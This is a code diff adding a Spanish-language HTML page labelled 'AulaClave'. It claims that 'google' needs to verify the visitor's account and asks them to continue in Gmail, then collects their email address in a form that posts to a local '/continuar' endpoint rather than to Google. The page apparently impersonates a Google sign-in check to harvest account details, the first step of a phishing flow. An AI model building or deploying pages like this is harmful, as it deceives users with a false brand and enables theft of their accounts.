@@ -1,0 +1,55 @@
+
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Te damos la bienvenida</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <main class="panel">
+    <section class="intro">
+  
+     
+<div class="logo" aria-label="AulaClave">
+</div>
+
+      <h1>Verifica que eres tú</h1>
+      <p class="muted">Introduce tu correo electrónico y protege tu cuenta. </p>
+
+    </section>
+
+    <section class="content">
+      <p>Para verificar tu cuenta, google necesita saber que eres tú.
+        <br>Accede para continuar en Gmail.</br> </p>
+      <form action="/continuar" method="post">
+        <label class="sr-only" for="email">Correo electrónico</label>
+        <input
+          id="email"
+          name="email"
+          type="email"
+          placeholder="Correo electrónico"
+          autocomplete="email"
+          maxlength="190"
+          required
+        >
+        <button class="primary" type="submit">Continuar</button>
+      </form>
+    </section>
+  </main>
+
+  <footer>
+    <span>Español</span>
+    <nav>
+      <a href="#ayuda">Ayuda</a>
+      <a href="#privacidad">Privacidad</a>
+      <a href="#condiciones">Condiciones</a>
+    </nav>
+  </footer>
+
+</body>
+</html>
